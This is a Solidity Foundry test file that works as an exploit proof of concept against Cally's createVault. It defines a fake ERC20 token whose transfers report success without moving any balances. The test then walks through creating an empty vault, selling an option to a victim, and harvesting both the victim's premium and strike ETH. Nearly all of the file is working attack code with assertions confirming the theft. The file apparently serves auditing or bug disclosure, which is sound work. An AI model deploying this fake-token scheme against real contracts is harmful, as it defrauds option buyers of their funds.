pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";

/**
 * @dev ERC20 implementation that PRETENDS every transfer succeeds
 *      but never actually moves balances.  This mirrors real-world
 *      “non-standard” tokens that simply return `true` even on failure.
 */
contract FakeERC20 is ERC20 {
    constructor() ERC20("Fake Token", "FAKE", 18) {}

    /* ------------- TEST HELPERS ------------- */
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    /* ------------- BROKEN ERC20 LOGIC ------------- */

    // Always returns true – but does NOT modify balances
    function transfer(address to, uint256 amount) public override returns (bool) {
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    // Always returns true – but does NOT modify balances / allowances
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        emit Transfer(from, to, amount);
        return true;
    }
}

/**
 * Exploit PoC for missing transfer-success verification inside Cally.createVault().
 *
 * Flow:
 * 1. Attacker deploys a FakeERC20 that lies about transfers succeeding.
 * 2. Attacker creates a vault without actually depositing any tokens
 *    (transferFrom silently “succeeds”).
 * 3. Victim buys the option and pays the premium (ETH) to the vault.
 * 4. Victim exercises the option and pays the strike (more ETH) but
 *    receives ZERO tokens because the vault never held any.
 * 5. Attacker harvests both premium and strike ETH – pure profit.
 */
contract ExploitTest is Test {
    Cally internal cally;
    FakeERC20 internal fake;

    address internal attacker = address(0xA11CE);
    address internal victim   = address(0xB0B);

    function setUp() public {
        vm.label(attacker, "Attacker");
        vm.label(victim,   "Victim");

        cally = new Cally();
        fake  = new FakeERC20();

        // Fund accounts with ETH for gas / payments
        vm.deal(attacker, 10 ether);
        vm.deal(victim,   10 ether);
    }

    function testExploit() public {
        /* ============================================================
                              PHASE 1: Empty Vault
        ============================================================ */
        vm.startPrank(attacker);

        uint8   premiumIndex      = 0;           // 0.01 ether premium
        uint8   durationDays      = 7;
        uint8   strikeStartIndex  = 0;           // 1 ether starting strike
        uint256 reserveStrike     = 0.5 ether;
        uint256 fakeTokenAmount   = 100 ether;

        // Sanity: Cally holds zero FAKE before creation
        assertEq(fake.balanceOf(address(cally)), 0, "Pre-condition failed");

        uint256 vaultId = cally.createVault(
            fakeTokenAmount,
            address(fake),
            premiumIndex,
            durationDays,
            strikeStartIndex,
            reserveStrike,
            Cally.TokenType.ERC20
        );

        // Vault should be odd-numbered token
        assertEq(vaultId % 2, 1, "Vault id parity broken");

        // STILL zero because transferFrom never moved tokens
        assertEq(fake.balanceOf(address(cally)), 0, "Tokens unexpectedly transferred");

        vm.stopPrank();

        /* ============================================================
                              PHASE 2: Buy Option
        ============================================================ */
        vm.startPrank(victim);

        uint256 premium = cally.getPremium(vaultId); // 0.01 ether
        cally.buyOption{value: premium}(vaultId);

        uint256 optionId = vaultId + 1;
        assertEq(cally.ownerOf(optionId), victim, "Victim does not own option");

        vm.stopPrank();

        /* ============================================================
                           PHASE 3: Harvest Premium
        ============================================================ */
        vm.startPrank(attacker);

        uint256 balanceBeforeHarvest = attacker.balance;
        uint256 harvestedPremium     = cally.harvest();

        assertEq(harvestedPremium, premium, "Harvested premium mismatch");
        assertEq(attacker.balance, balanceBeforeHarvest + premium, "Premium not received");

        vm.stopPrank();

        /* ============================================================
                       PHASE 4: Victim Exercises Option
        ============================================================ */
        vm.startPrank(victim);

        Cally.Vault memory info = cally.vaults(vaultId);
        uint256 strike = info.currentStrike;
        assertGt(strike, 0, "Strike should be > 0");

        uint256 victimEthBefore   = victim.balance;
        uint256 victimTokensBefore = fake.balanceOf(victim);

        cally.exercise{value: strike}(optionId);

        // Victim lost ETH
        assertEq(victim.balance, victimEthBefore - strike, "ETH deduction failed");
        // Victim received NO tokens
        assertEq(fake.balanceOf(victim), victimTokensBefore, "Victim unexpectedly received tokens");

        vm.stopPrank();

        /* ============================================================
                     PHASE 5: Attacker Harvests Strike ETH
        ============================================================ */
        vm.startPrank(attacker);

        uint256 balanceBeforeStrike = attacker.balance;
        uint256 harvestedStrike     = cally.harvest();

        assertEq(harvestedStrike, strike, "Harvested strike mismatch");
        assertEq(attacker.balance, balanceBeforeStrike + strike, "Strike not received");

        vm.stopPrank();

        /* ============================================================
                                FINAL ASSERTS
        ============================================================ */
        // Cally contract never held any tokens
        assertEq(fake.balanceOf(address(cally)), 0, "Cally holds unexpected tokens");
        // Fake token supply remained zero throughout exploit
        assertEq(fake.totalSupply(), 0, "Fake token supply changed");
    }
}